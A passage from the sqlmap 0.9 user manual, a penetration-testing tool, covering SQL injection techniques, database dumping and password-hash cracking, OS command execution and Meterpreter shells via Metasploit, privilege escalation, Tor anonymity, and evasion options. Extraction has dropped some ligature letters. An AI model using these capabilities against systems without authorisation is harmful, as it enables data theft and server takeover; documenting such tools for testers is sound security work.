   • Identify the vulnerable parameter(s) (id in this example);

   • Identify which SQL injection techniques can be used to exploit the vulnerable parameter(s);

   • Fingerprint the back-end database management system;

   • Depending on the user's options, it will extensively ngerprint, enumerate data or takeover the database
     server as a whole.

1.2.2 Direct connection to the database management system

Up until sqlmap version 0.8, the tool has been yet another SQL injection tool , used by web application
penetration testers/newbies/curious teens/computer addicted/punks and so on. Things move on and as
they evolve, we do as well. Now it supports this new switch, -d, that allows you to connect from your
machine to the database server's TCP port where the database management system daemon is listening on
and perform any operation you would do while using it to attack a database via a SQL injection vulnerability.


1.3 Techniques
sqlmap is able to detect and exploit ve dierent SQL injection types :

   • Boolean-based blind SQL injection, also known as inferential SQL injection: sqlmap replaces
     or appends to the aected parameter in the HTTP request, a syntatically valid SQL statement string
     containing a SELECT sub-statement, or any other SQL statement whose the user want to retrieve the
2. Features                                                                                                   7


      output. For each HTTP response, by making a comparison between the HTTP response headers/body
      with the original request, the tool inference the output of the injected statement character by character.
      Alternatively, the user can provide a string or regular expression to match on True pages. The bisection
      algorithm implemented in sqlmap to perform this technique is able to fetch each character of the output
      with a maximum of seven HTTP requests. Where the output is not within the clear-text plain charset,
      sqlmap will adapt the algorithm with bigger ranges to detect the output.
    • Time-based blind SQL injection, also known as full blind SQL injection: sqlmap replaces or
      appends to the aected parameter in the HTTP request, a syntatically valid SQL statement string
      containing a query which put on hold the back-end DBMS to return for a certain number of seconds.
      For each HTTP response, by making a comparison between the HTTP response time with the original
      request, the tool inference the output of the injected statement character by character. Like for
      boolean-based technique, the bisection algorithm is applied.
    • Error-based SQL injection: sqlmap replaces or append to the aected parameter a database-specic
      syntatically wrong statement and parses the HTTP response headers and body in search of DBMS
      error messages containing the injected pre-dened chain of characters and the statement output within.
      This technique works when the web application has been congured to disclose back-end database
      management system error messages only.
    • UNION query SQL injection, also known as inband SQL injection: sqlmap appends to the
      aected parameter a syntatically valid SQL statement string starting with a UNION ALL SELECT. This
      techique works when the web application page passes the output of the SELECT statement within a for
      cycle, or similar, so that each line of the query output is printed on the page content. sqlmap is also
      able to exploit partial (single entry) UNION query SQL injection vulnerabilities which occur
      when the output of the statement is not cycled in a for construct whereas only the rst entry of the
      query output is displayed.
    • Stacked queries SQL injection, also known as multiple statements SQL injection: sqlmap tests
      if the web application supports stacked queries then, in case it does support, it appends to the aected
      parameter in the HTTP request, a semi-colon (;) followed by the SQL statement to be executed.
      This technique is useful to run SQL statements other than SELECT like, for instance, data denition
      or data manipulation statements possibly leading to le system read and write access and operating
      system command execution depending on the underlying back-end database management system and
      the session user privileges.


1.4 Demo
You can watch several demo videos, they are hosted on YouTube .


2    Features
Features implemented in sqlmap include:


2.1 Generic features
    • Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access,
      SQLite, Firebird, Sybase and SAP MaxDB database management systems.
    • Full support for ve SQL injection techniques: boolean-based blind, time-based blind, error-
      based, UNION query and stacked queries.
2. Features                                                                                                 8


  • Support to directly connect to the database without passing via a SQL injection, by providing
    DBMS credentials, IP address, port and database name.
  • It is possible to provide a single target URL, get the list of targets from Burp proxy or WebScarab proxy
    requests log les, get the whole HTTP request from a text le or get the list of targets by providing
    sqlmap with a Google dork which queries Google search engine and parses its results page. You can
    also dene a regular-expression based scope that is used to identify which of the parsed addresses to
    test.
  • Tests provided GET parameters, POST parameters, HTTP Cookie header values, HTTP User-
    Agent header value and HTTP Referer header value to identify and exploit SQL injection vulnera-
    bilities. It is also possible to specify a comma-separated list of specic parameter(s) to test.
  • Option to specify the maximum number of concurrent HTTP(S) requests (multi-threading)
    to speed up the blind SQL injection techniques. Vice versa, it is also possible to specify the number
    of seconds to hold between each HTTP(S) request. Others optimization switches to speed up the
    exploitation are implemented too.
  • HTTP Cookie header string support, useful when the web application requires authentication based
    upon cookies and you have such data or in case you just want to test for and exploit SQL injection on
    such header values. You can also specify to always URL-encode the Cookie.
  • Automatically handles HTTP Set-Cookie header from the application, re-establishing of the session
    if it expires. Test and exploit on these values is supported too. Vice versa, you can also force to ignore
    any Set-Cookie header.
  • HTTP protocol Basic, Digest, NTLM and Certicate authentications support.

  • HTTP(S) proxy support to pass by the requests to the target application that works also with
    HTTPS requests and with authenticated proxy servers.
  • Options to fake the HTTP Referer header value and the HTTP User-Agent header value specied
    by user or randomly selected from a textual le.
  • Support to increase the verbosity level of output messages: there exist seven levels of verbosity.

  • Support to parse HTML forms from the target URL and forge HTTP(S) requests against those
    pages to test the form parameters against vulnerabilities.
  • Granularity and exibility in terms of both user's switches and features.

  • Estimated time of arrival support for each query, updated in real time, to provide the user with an
    overview on how long it will take to retrieve the queries' output.
  • Automatically saves the session (queries and their output, even if partially retrieved) on a textual le
    in real time while fetching the data and resumes the injection by parsing the session le.
  • Support to read options from a conguration INI le rather than specify each time all of the switches
    on the command line. Support also to generate a conguration le based on the command line switches
    provided.
  • Support to replicate the back-end database tables structure and entries on a local SQLite 3
    database.
  • Option to update sqlmap to the latest development version from the subversion repository.

  • Support to parse HTTP(S) responses and display any DBMS error message to the user.

  • Integration with other IT security open source projects, Metasploit and w3af .
2. Features                                                                                             9


2.2 Fingerprint and enumeration features
   • Extensive back-end database software version and underlying operating system nger-
     print based upon error messages , banner parsing , functions output comparison and specic features
     such as MySQL comment injection. It is also possible to force the back-end database management
     system name if you already know it.
   • Basic web server software and web application technology ngerprint.

   • Support to retrieve the DBMS banner, session user and current database information. The tool
     can also check if the session user is a database administrator (DBA).
   • Support to enumerate database users, users' password hashes, users' privileges, users' roles,
     databases, tables and columns.
   • Automatic recognition of password hashes format and support to crack them with a dictionary-
     based attack.
   • Support to brute-force tables and columns name. This is useful when the session user has no
     read access over the system table containing schema information or when the database management
     system does not store this information anywhere (e.g. MySQL < 5.0).
   • Support to dump database tables entirely, a range of entries or specic columns as per user's choice.
     The user can also choose to dump only a range of characters from each column's entry.
   • Support to automatically dump all databases' schemas and entries. It is possibly to exclude from
     the dump the system databases.
   • Support to search for specic database names, specic tables across all databases or specic
     columns across all databases' tables. This is useful, for instance, to identify tables containing
     custom application credentials where relevant columns' names contain string like name and pass .
   • Support to run custom SQL statement(s) as in an interactive SQL client connecting to the back-
     end database. sqlmap automatically dissects the provided statement, determines which technique ts
     best to inject it and how to pack the SQL payload accordingly.

2.3 Takeover features
Some of these techniques are detailed in the white paper Advanced SQL injection to operating system full
control and in the slide deck Expanding the control over the operating system from the database .

   • Support to inject custom user-dened functions: the user can compile a shared library then use
     sqlmap to create within the back-end DBMS user-dened functions out of the compiled shared library
     le. These UDFs can then be executed, and optionally removed, via sqlmap. This is supported when
     the database software is MySQL or PostgreSQL.
   • Support to download and upload any le from the database server underlying le system when
     the database software is MySQL, PostgreSQL or Microsoft SQL Server.
   • Support to execute arbitrary commands and retrieve their standard output on the database
     server underlying operating system when the database software is MySQL, PostgreSQL or Microsoft
     SQL Server.
         On MySQL and PostgreSQL via user-dened function injection and execution.
         On Microsoft SQL Server via xp_cmdshell() stored procedure. Also, the stored procedure is
          re-enabled if disabled or created from scratch if removed by the DBA.
3. History                                                                                                10


    • Support to establish an out-of-band stateful TCP connection between the attacker machine
      and the database server underlying operating system. This channel can be an interactive command
      prompt, a Meterpreter session or a graphical user interface (VNC) session as per user's choice. sqlmap
      relies on Metasploit to create the shellcode and implements four dierent techniques to execute it on
      the database server. These techniques are:
         Database in-memory execution of the Metasploit's shellcode via sqlmap own user-dened
          function sys_bineval(). Supported on MySQL and PostgreSQL.
         Upload and execution of a Metasploit's stand-alone payload stager via sqlmap own user-
          dened function sys_exec() on MySQL and PostgreSQL or via xp_cmdshell() on Microsoft
          SQL Server.
         Execution of Metasploit's shellcode by performing a SMB reection attack (MS08-068 ) with
          a UNC path request from the database server to the attacker's machine where the Metasploit
          smb_relay server exploit listens. Supported when running sqlmap with high privileges (uid=0)
          on Linux/Unix and the target DBMS runs as Administrator on Windows.
         Database in-memory execution of the Metasploit's shellcode by exploiting Microsoft SQL
          Server 2000 and 2005 sp_replwritetovarbin stored procedure heap-based buer over-
          ow (MS09-004 ). sqlmap has its own exploit to trigger the vulnerability with automatic DEP
          memory protection bypass, but it relies on Metasploit to generate the shellcode to get executed
          upon successful exploitation.
    • Support for database process' user privilege escalation via Metasploit's getsystem command
      which include, among others, the kitrap0d technique (MS10-015 ).
    • Support to access (read/add/delete) Windows registry hives.



3    History
3.1 2011
    • April 10, Bernardo and Miroslav release sqlmap 0.9 featuring a totally rewritten and powerful SQL
      injection detection engine, the possibility to connect directly to a database server, support for time-
      based blind SQL injection and error-based SQL injection, support for four new database management
      systems and much more.


3.2 2010
    • December, Bernardo and Miroslav have enhanced sqlmap a lot during the whole year and prepare to
      release sqlmap 0.9 within the rst quarter of 2011.
    • June 3, Bernardo presents a talk titled Got database access? Own the network! at AthCon 2010 in
      Athens (Greece).
    • March 14, Bernardo and Miroslav release stable version of sqlmap 0.8 featuring many features.
      Amongst these, support to enumerate and dump all databases' tables containing user provided col-
      umn(s), stabilization and enhancements to the takeover functionalities, updated integration with
      Metasploit 3.3.3 and a lot of minor features and bug xes.
    • March, sqlmap demo videos have been published .

    • January, Bernardo is invited to present at AthCon conference in Greece on June 2010.
3. History                                                                                            11


3.3 2009
  • December 18, Miroslav Stampar replies to the call for developers. Along with Bernardo, he actively
    develops sqlmap from version 0.8 release candidate 2.
  • December 12, Bernardo writes to the mailing list a post titled sqlmap state of art - 3 years later
    highlighting the goals achieved during these rst three years of the project and launches a call for
    developers.
  • December 4, sqlmap-devel mailing list has been merged into sqlmap-users mailing list .

  • November 20, Bernardo and Guido present again their research on stealth database server takeover
    at CONdence 2009 in Warsaw, Poland.
  • September 26, sqlmap version 0.8 release candidate 1 goes public on the subversion repository ,
    with all the attack vectors unveiled at SOURCE Barcelona 2009 Conference. These include an enhanced
    version of the Microsoft SQL Server buer overow exploit to automatically bypass DEP memory
    protection, support to establish the out-of-band connection with the database server by executing in-
    memory the Metasploit shellcode via UDF sys_bineval() (anti-forensics technique), support to access
    the Windows registry hives and support to inject custom user-dened functions.
  • September 21, Bernardo and Guido Landi present their research (slides ) at SOURCE Conference
    2009 in Barcelona, Spain.
  • August, Bernardo is accepted as a speaker at two others IT security conferences, SOURCE Barcelona
    2009 and CONdence 2009 Warsaw . This new research is titled Expanding the control over the
    operating system from the database .
  • July 25, stable version of sqlmap 0.7 is out!

  • June 27, Bernardo presents an updated version of his SQL injection: Not only AND 1=1 slides at
    2nd Digital Security Forum in Lisbon, Portugal.
  • June 2, sqlmap version 0.6.4 has made its way to the ocial Ubuntu repository too.

  • May, Bernardo presents again his research on operating system takeover via SQL injection at OWASP
    AppSec Europe 2009 in Warsaw, Poland and at EUSecWest 2009 in London, UK.
  • May 8, sqlmap version 0.6.4 has been ocially accepted in Debian repository. Details on this blog
    post .
  • April 22, sqlmap version 0.7 release candidate 1 goes public, with all the attack vectors unveiled at
    Black Hat Europe 2009 Conference. These include execution of arbitrary commands on the underlying
    operating system, full integration with Metasploit to establish an out-of-band TCP connection, rst
    publicly available exploit for Microsoft Security Bulletin MS09-004 against Microsoft SQL Server 2000
    and 2005 and others attacks to takeover the database server as a whole, not only the data from the
    database.
  • April 16, Bernardo presents his research (slides , whitepaper ) at Black Hat Europe 2009 in Ams-
    terdam, The Netherlands. The feedback from the audience is good and there has been some media
    coverage too.
  • March 5, Bernardo presents for the rst time some of the sqlmap recent features and upcoming
    enhancements at an international event, Front Range OWASP Conference 2009 in Denver, USA. The
    presentation is titled SQL injection: Not only AND 1=1 .
  • February 24, Bernardo is accepted as a speaker at Black Hat Europe 2009 with a presentation titled
    Advanced SQL injection exploitation to operating system full control .
3. History                                                                                                 12


  • February 3, sqlmap 0.6.4 is the last point release for 0.6: taking advantage of the stacked queries
    test implemented in 0.6.3, sqlmap can now be used to execute any arbitrary SQL statement, not only
    SELECT anymore. Also, many features have been stabilized, tweaked and improved in terms of speed
    in this release.
  • January 9, Bernardo presents SQL injection exploitation internals at a private event in London, UK.


3.4 2008
  • December 18, sqlmap 0.6.3 is released featuring support to retrieve targets from Burp and WebScarab
    proxies log les, support to test for stacked queries ant time-based blind SQL injection, rough ngerprint
    of the web server and web application technologies in use and more options to customize the HTTP
    requests and enumerate more information from the database.
  • November 2, sqlmap version 0.6.2 is a "bug xes" release only.

  • October 20, sqlmap rst point release, 0.6.1, goes public. This includes minor bug xes and the
    rst contact between the tool and Metasploit : an auxiliary module to launch sqlmap from within
    Metasploit Framework. The subversion development repository goes public again.
  • September 1, nearly one year after the previous release, sqlmap 0.6 comes to life featuring a complete
    code refactoring, support to execute arbitrary SQL SELECT statements, more options to enumerate
    and dump specic information are added, brand new installation packages for Debian, Red Hat, Win-
    dows and much more.
  • August, two public mailing lists are created on SourceForge.

  • January, sqlmap subversion development repository is moved away from SourceForge and goes private
    for a while.


3.5 2007
  • November 4, release 0.5 marks the end of the OWASP Spring of Code 2007 contest participation.
    Bernardo has accomplished all the propsed objects which include also initial support for Oracle, en-
    hanced support for UNION query SQL injection and support to test and exploit SQL injections in
    HTTP Cookie and User-Agent headers.
  • June 15, Bernardo releases version 0.4 as a result of the rst OWASP Spring of Code 2007 milestone.
    This release features, amongst others, improvements to the DBMS ngerprint engine, support to
    calculate the estimated time of arrival, options to enumerate specic data from the database server
    and brand new logging system.
  • April, even though sqlmap was not and is not an OWASP project, it gets accepted , amongst many
    other open source projects to OWASP Spring of Code 2007.
  • March 30, Bernardo applies to OWASP Spring of Code 2007 .

  • January 20, sqlmap version 0.3 is released, featuring initial support for Microsoft SQL Server, support
    to test and exploit UNION query SQL injections and injection points in POST parameters.
4. Download and update                                                                                   13


3.6 2006
      • December 13, Bernardo releases version 0.2 with major enhancements to the DBMS ngerprint
        functionalities and replacement of the old inference algorithm with the bisection algorithm.
      • September, Daniele leaves the project, Bernardo Damele A. G. takes it over.

      • August, Daniele adds initial support for PostgreSQL and releases version 0.1.

      • July 25, Daniele Bellucci registers the sqlmap project on SourceForge and develops it on the Source-
        Forge subversion repository . The skeleton is implemented and limited support for MySQL added.


4      Download and update
sqlmap can be downloaded from its SourceForge File List page . It is available in two formats:

      • Source gzip compressed .

      • Source zip compressed .

You can also checkout the latest development version from the subversion repository:

        $ svn checkout https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap-dev

You can update it at any time to the latest development version by running:

        $ python sqlmap.py --update

Or:

        $ svn update

This is strongly recommended before reporting any bug to the mailing list .


5      Usage
        $ python sqlmap.py -h

            sqlmap/0.9 - automatic SQL injection and database takeover tool
            http://sqlmap.sourceforge.net

        Usage: python sqlmap.py [options]

        Options:
          --version                show program's version number and exit
          -h, --help               show this help message and exit
          -v VERBOSE               Verbosity level: 0-6 (default 1)

          Target:
            At least one of these options has to be specified to set the source to
            get target urls from.
5. Usage                                                                              14


       -d   DIRECT           Direct connection to the database
       -u   URL, --url=URL   Target url
       -l   LIST             Parse targets from Burp or WebScarab proxy logs
       -r   REQUESTFILE      Load HTTP request from a file
       -g   GOOGLEDORK       Process Google dork results as target urls
       -c   CONFIGFILE       Load options from a configuration INI file

     Request:
       These options can be used to specify how to connect to the target url.

       --data=DATA           Data string to be sent through POST
       --cookie=COOKIE       HTTP Cookie header
       --cookie-urlencode    URL Encode generated cookie injections
       --drop-set-cookie     Ignore Set-Cookie header from response
       --user-agent=AGENT    HTTP User-Agent header
       --random-agent        Use randomly selected HTTP User-Agent header
       --referer=REFERER     HTTP Referer header
       --headers=HEADERS     Extra HTTP headers newline separated
       --auth-type=ATYPE     HTTP authentication type (Basic, Digest or NTLM)
       --auth-cred=ACRED     HTTP authentication credentials (name:password)
       --auth-cert=ACERT     HTTP authentication certificate (key_file,cert_file)
       --proxy=PROXY         Use a HTTP proxy to connect to the target url
       --proxy-cred=PCRED    HTTP proxy authentication credentials (name:password)
       --ignore-proxy        Ignore system default HTTP proxy
       --delay=DELAY         Delay in seconds between each HTTP request
       --timeout=TIMEOUT     Seconds to wait before timeout connection (default 30)
       --retries=RETRIES     Retries when the connection timeouts (default 3)
       --scope=SCOPE         Regexp to filter targets from provided proxy log
       --safe-url=SAFURL     Url address to visit frequently during testing
       --safe-freq=SAFREQ    Test requests between two visits to a given safe url

     Optimization:
       These options can be used to optimize the performance of sqlmap.

       -o                    Turn on all optimization switches
       --predict-output      Predict common queries output
       --keep-alive          Use persistent HTTP(s) connections
       --null-connection     Retrieve page length without actual HTTP response body
       --threads=THREADS     Max number of concurrent HTTP(s) requests (default 1)

     Injection:
       These options can be used to specify which parameters to test for,
       provide custom injection payloads and optional tampering scripts.

       -p TESTPARAMETER      Testable parameter(s)
       --dbms=DBMS           Force back-end DBMS to this value
       --os=OS               Force back-end DBMS operating system to this value
       --prefix=PREFIX       Injection payload prefix string
       --suffix=SUFFIX       Injection payload suffix string
       --tamper=TAMPER       Use given script(s) for tampering injection data

     Detection:
       These options can be used to specify how to parse and compare page
       content from HTTP responses when using blind SQL injection technique.
5. Usage                                                                             15


       --level=LEVEL        Level of tests to perform (1-5, default 1)
       --risk=RISK          Risk of tests to perform (0-3, default 1)
       --string=STRING      String to match in page when the query is valid
       --regexp=REGEXP      Regexp to match in page when the query is valid
       --text-only          Compare pages based only on the textual content

     Techniques:
       These options can be used to tweak testing of specific SQL injection
       techniques.

       --technique=TECH     SQL injection techniques to test for (default BEUST)
       --time-sec=TIMESEC   Seconds to delay the DBMS response (default 5)
       --union-cols=UCOLS   Range of columns to test for UNION query SQL injection
       --union-char=UCHAR   Character to use for bruteforcing number of columns

     Fingerprint:
       -f, --fingerprint    Perform an extensive DBMS version fingerprint

     Enumeration:
       These options can be used to enumerate the back-end database
       management system information, structure and data contained in the
       tables. Moreover you can run your own SQL statements.

       -b, --banner         Retrieve DBMS banner
       --current-user       Retrieve DBMS current user
       --current-db         Retrieve DBMS current database
       --is-dba             Detect if the DBMS current user is DBA
       --users              Enumerate DBMS users
       --passwords          Enumerate DBMS users password hashes
       --privileges         Enumerate DBMS users privileges
       --roles              Enumerate DBMS users roles
       --dbs                Enumerate DBMS databases
       --tables             Enumerate DBMS database tables
       --columns            Enumerate DBMS database table columns
       --dump               Dump DBMS database table entries
       --dump-all           Dump all DBMS databases tables entries
       --search             Search column(s), table(s) and/or database name(s)
       -D DB                DBMS database to enumerate
       -T TBL               DBMS database table to enumerate
       -C COL               DBMS database table column to enumerate
       -U USER              DBMS user to enumerate
       --exclude-sysdbs     Exclude DBMS system databases when enumerating tables
       --start=LIMITSTART   First query output entry to retrieve
       --stop=LIMITSTOP     Last query output entry to retrieve
       --first=FIRSTCHAR    First query output word character to retrieve
       --last=LASTCHAR      Last query output word character to retrieve
       --sql-query=QUERY    SQL statement to be executed
       --sql-shell          Prompt for an interactive SQL shell

     Brute force:
       These options can be used to run brute force checks.

       --common-tables      Check existence of common tables
       --common-columns     Check existence of common columns
5. Usage                                                                            16


     User-defined function injection:
       These options can be used to create custom user-defined functions.

       --udf-inject       Inject custom user-defined functions
       --shared-lib=SHLIB Local path of the shared library

     File system access:
       These options can be used to access the back-end database management
       system underlying file system.

       --file-read=RFILE Read a file from the back-end DBMS file system
       --file-write=WFILE Write a local file on the back-end DBMS file system
       --file-dest=DFILE Back-end DBMS absolute filepath to write to

     Operating system access:
       These options can be used to access the back-end database management
       system underlying operating system.

       --os-cmd=OSCMD       Execute an operating system command
       --os-shell           Prompt for an interactive operating system shell
       --os-pwn             Prompt for an out-of-band shell, meterpreter or VNC
       --os-smbrelay        One click prompt for an OOB shell, meterpreter or VNC
       --os-bof             Stored procedure buffer overflow exploitation
       --priv-esc           Database process' user privilege escalation
       --msf-path=MSFPATH   Local path where Metasploit Framework 3 is installed
       --tmp-path=TMPPATH   Remote absolute path of temporary files directory

     Windows registry access:
       These options can be used to access the back-end database management
       system Windows registry.

       --reg-read           Read a Windows registry key value
       --reg-add            Write a Windows registry key value data
       --reg-del            Delete a Windows registry key value
       --reg-key=REGKEY     Windows registry key
       --reg-value=REGVAL   Windows registry key value
       --reg-data=REGDATA   Windows registry key value data
       --reg-type=REGTYPE   Windows registry key value type

     General:
       These options can be used to set some general working parameters.

       -t TRAFFICFILE       Log all HTTP traffic into a textual file
       -s SESSIONFILE       Save and resume all data retrieved on a session file
       --flush-session      Flush session file for current target
       --fresh-queries      Ignores query results stored in session file
       --eta                Display for each output the estimated time of arrival
       --update             Update sqlmap
       --save               Save options on a configuration INI file
       --batch              Never ask for user input, use the default behaviour

     Miscellaneous:
       --beep               Alert when sql injection found
       --check-payload      IDS detection testing of injection payloads
       --cleanup            Clean up the DBMS by sqlmap specific UDF and tables
5. Usage                                                                                                  17


          --forms               Parse and test forms on target url
          --gpage=GOOGLEPAGE    Use Google dork results from specified page number
          --page-rank           Display page rank (PR) for Google dork results
          --parse-errors        Parse DBMS error messages from response pages
          --replicate           Replicate dumped data into a sqlite3 database
          --tor                 Use default Tor (Vidalia/Privoxy/Polipo) proxy address
          --wizard              Simple wizard interface for beginner users


5.1 Output verbosity
Switch: -v
This switch can be used to set the verbosity level of output messages. There exist seven levels of verbosity.
The default level is 1 in which information, warning, error and critical messages and Python tracebacks (if
any occur) will be displayed.

   • 0: Show only Python tracebacks, error and critical messages.

   • 1: Show also information and warning messages.

   • 2: Show also debug messages.

   • 3: Show also payloads injected.

   • 4: Show also HTTP requests.

   • 5: Show also HTTP responses' headers.

   • 6: Show also HTTP responses' page content.

A reasonable level of verbosity to further understand what sqlmap does under the hood is level 2, primarily
for the detection phase and the take-over functionalities. Whereas if you want to see the SQL payloads the
tools sends, level 3 is your best choice. In order to further debug potential bugs or unexpected behaviours,
we recommend you to set the verbosity to level 4 or above. This level is recommended to be used when you
feed the developers with a bug report too.


5.2 Target
At least one of these options has to be provided.

5.2.1 Target URL

Switch: -u or --url
Run sqlmap against a single target URL. This switch requires an argument which is the target URL in the
form http(s)://targeturl[:port]/[...].

5.2.2 Parse targets from Burp or WebScarab proxy logs

Switch: -l
Rather than providing a single target URL, it is possible to test and inject against HTTP requests proxied
through Burp proxy or WebScarab proxy This switch requires an argument which is the proxy's HTTP
requests log le.
5. Usage                                                                                                 18


5.2.3 Load HTTP request from a le

Switch: -r
One of the possibilities of sqlmap is loading of complete HTTP request from a textual le. That way you
can skip usage of bunch of other options (e.g. setting of cookies, POSTed data, etc).
Sample content of a HTTP request le provided as argument to this switch:

     POST /sqlmap/mysql/post_int.php HTTP/1.1
     Host: 192.168.136.131
     User-Agent: Mozilla/4.0

     id=1


5.2.4 Process Google dork results as target addresses

Switch: -g
It is also possible to test and inject on GET parameters on the results of your Google dork.
This option makes sqlmap negotiate with the search engine its session cookie to be able to perform a search,
then sqlmap will retrieve Google rst 100 results for the Google dork expression with GET parameters asking
you if you want to test and inject on each possible aected URL.

5.2.5 Load options from a conguration INI le

Switch: -c
It is possible to pass user's options from a conguration INI le, an example is sqlmap.conf.
Note that if you also provide other options from command line, those are evaluated when running sqlmap
and overwrite those provided in the conguration le.


5.3 Request
These options can be used to specify how to connect to the target url.

5.3.1 HTTP data

Option: --data
By default the HTTP method used to perform HTTP requests is GET, but you can implicitly change it to
POST by providing the data to be sent in the POST requests. Such data, being those parameters, are tested
for SQL injection as well as any provided GET parameters.

5.3.2 HTTP Cookie header

Switches: --cookie, --drop-set-cookie and --cookie-urlencode
This feature can be useful in two ways:

   • The web application requires authentication based upon cookies and you have such data.

   • You want to detect and exploit SQL injection on such header values.
5. Usage                                                                                                    19


Either reason brings you to need to send cookies with sqlmap requests, the steps to go through are the
following:

   • Login to the application with your favourite browser.

   • Get the HTTP Cookie from the browser's preferences or from the HTTP proxy screen and copy to the
     clipboard.
   • Go back to your shell and run sqlmap by pasting your clipboard as the argument of the --cookie
     switch.

Note that the HTTP Cookie header values are usually separated by a ; character, not by an &. sqlmap can
recognize these as separate sets of parameter=value too, as well as GET and POST parameters.
If at any time during the communication, the web application responds with Set-Cookie headers, sqlmap will
automatically use its value in all further HTTP requests as the Cookie header. sqlmap will also automatically
test those values for SQL injection. This can be avoided by providing the switch --drop-set-cookie - sqlmap
will ignore any coming Set-Cookie header.
Vice versa, if you provide a HTTP Cookie header with --cookie switch and the target URL sends an HTTP
Set-Cookie header at any time, sqlmap will ask you which set of cookies to use for the following HTTP
requests.
sqlmap by default does not URL-encode generated cookie payloads, but you can force it by using the
--cookie-urlencode switch. Cookie content encoding is not declared by HTTP protocol standard in any
way, so it is solely the matter of web application's behaviour.
Note that also the HTTP Cookie header is tested against SQL injection if the --level is set to 2 or above.
Read below for details.

5.3.3 HTTP User-Agent header

Switches: --user-agent and --random-agent
By default sqlmap performs HTTP requests with the following User-Agent header value:

     sqlmap/0.9 (http://sqlmap.sourceforge.net)


However, it is possible to fake it with the --user-agent switch by providing custom User-Agent as the
switch argument.
Moreover, by providing the --random-agent switch, sqlmap will randomly select a User-Agent from the
./txt/user-agents.txt textual le and use it for all HTTP requests within the session.
Some sites perform a server-side check on the HTTP User-Agent header value and fail the HTTP response
if a valid User-Agent is not provided, its value is not expected or is blacklisted by a web application rewall
or similar intrusion prevention system. In this case sqlmap will show you a message as follows:

     [hh:mm:20] [ERROR] the target url responded with an unknown HTTP status code, try to
     force the HTTP User-Agent header with option --user-agent or --random-agent


Note that also the HTTP User-Agent header is tested against SQL injection if the --level is set to 3 or
above. Read below for details.
5. Usage                                                                                                 20


5.3.4 HTTP Referer header

Switch: --referer
It is possible to fake the HTTP Referer header value. By default no HTTP Referer header is sent in
HTTP requests if not explicitly set.
Note that also the HTTP Referer header is tested against SQL injection if the --level is set to 3 or above.
Read below for details.

5.3.5 Extra HTTP headers

Switch: --headers
It is possible to provide extra HTTP headers by setting the --headers switch. Each header must be
separated by a newline and it is much easier to provide them from the conguration INI le. Have a look at
the sample sqlmap.conf le for an example.

5.3.6 HTTP protocol authentication

Switches: --auth-type and --auth-cred
These options can be used to specify which HTTP protocol authentication the web server implements and
the valid credentials to be used to perform all HTTP requests to the target application.
The three supported HTTP protocol authentication mechanisms are:

   • Basic

   • Digest

   • NTLM

While the credentials' syntax is username:password.
Example of valid syntax:

     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" \
       --auth-type Basic --auth-cred "testuser:testpass"


5.3.7 HTTP protocol certicate authentication

Switch: --auth-cert
This switch should be used in cases when the web server requires proper client-side certicate for authenti-
cation. Supplied values should be in the form: key_file,cert_file, where key_file should be the name
of a PEM formatted le that contains your private key, while cert_file should be the name for a PEM
formatted certicate chain le.

5.3.8 HTTP(S) proxy

Switches: --proxy, --proxy-cred, --ignore-proxy and --tor
It is possible to provide an HTTP(S) proxy address to pass by the HTTP(S) requests to the target URL.
The syntax of HTTP(S) proxy value is http://url:port.
5. Usage                                                                                                  21


If the HTTP(S) proxy requires authentication, you can provide the credentials in the format
username:password to the --proxy-cred switch.
If, for any reason, you need to stay anonymous, instead of passing by a single predened HTTP(S) proxy
server, you can congure a Tor client together with Privoxy (or similar) on your machine as explained on
the Tor client guide and use the Privoxy daemon, by default listening on 127.0.0.1:8118, as the sqlmap
proxy by simply providing the tool with the --tor switch instead of --proxy.
The switch --ignore-proxy should be used when you want to run sqlmap against a target part of a local
area network by ignoring the system-wide set HTTP(S) proxy server setting.

5.3.9 Delay between each HTTP request

Switch: --delay
It is possible to specify a number of seconds to hold between each HTTP(S) request. The valid value is a
oat, for instance 0.5 means half a second. By default, no delay is set.

5.3.10 Seconds to wait before timeout connection

Switch: --timeout
It is possible to specify a number of seconds to wait before considering the HTTP(S) request timed out. The
valid value is a oat, for instance 10.5 means ten seconds and a half. By default 30 seconds are set.

5.3.11 Maximum number of retries when the HTTP connection timeouts

Switch: --retries
It is possible to specify the maximum number of retries when the HTTP(S) connection timeouts. By default
it retries up to three times.

5.3.12 Filtering targets from provided proxy log using regular expression

Switch: --scope
Rather than using all hosts parsed from provided logs with switch -l, you can specify valid Python regular
expression to be used for ltering desired ones.
Example of valid syntax:

     $ python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"


5.3.13 Avoid your session to be destroyed after too many unsuccessful requests

Switches: --safe-url and --safe-freq
Sometimes web applications or inspection technology in between destroys the session if a certain number of
unsuccessful requests is performed. This might occur during the detection phase of sqlmap or when it exploits
any of the blind SQL injection types. Reason why is that the SQL payload does not necessarily returns output
and might therefore raise a signal to either the application session management or the inspection technology.
To bypass this limitation set by the target, you can provide two switches:

   • --safe-url: Url address to visit frequently during testing.
5. Usage                                                                                                  22


   • --safe-freq: Test requests between two visits to a given safe url.

This way, sqlmap will visit every a predened number of requests a certain safe URL without performing
any kind of injection against it.

5.4 Optimization
These switches can be used to optimize the performance of sqlmap.

5.4.1 Bundle optimization

Switch: -o
This switch is an alias that implicitly sets the following switches:

   • --keep-alive

   • --null-connection

   • --threads 3 if not set to a higher value.

Read below for details about each switch.

5.4.2 Output prediction

Switch: --predict-output
This switch is used in inference algorithm for sequential statistical prediction of characters of value being
retrieved. Statistical table with the most promising character values is being built based on items given in
txt/common-outputs.txt combined with the knowledge of current enumeration used. In case that the value
can be found among the common output values, as the process progresses, subsequent character tables are
being narrowed more and more. If used in combination with retrieval of common DBMS entities, as with
system table names and privileges, speed up is signicant. Of course, you can edit the common outputs le
according to your needs if, for instance, you notice common patterns in database table names or similar.
Note that this switch is not compatible with --threads switch.

5.4.3 HTTP Keep-Alive

Switch: --keep-alive
This switch instructs sqlmap to use persistent HTTP(s) connections.
Note that this switch is incompatible with --proxy switch.

5.4.4 HTTP NULL connection

Switch: --null-connection
There are special HTTP request types which can be used to retrieve HTTP response's size without getting
the HTTP body. This knowledge can be used in blind injection technique to distinguish True from False
responses. When this switch is provided, sqlmap will try to test and exploit two dierent NULL connection
techniques: Range and HEAD. If any of these is supported by the target web server, speed up will come from
the obvious saving of used bandwidth.
5. Usage                                                                                                   23


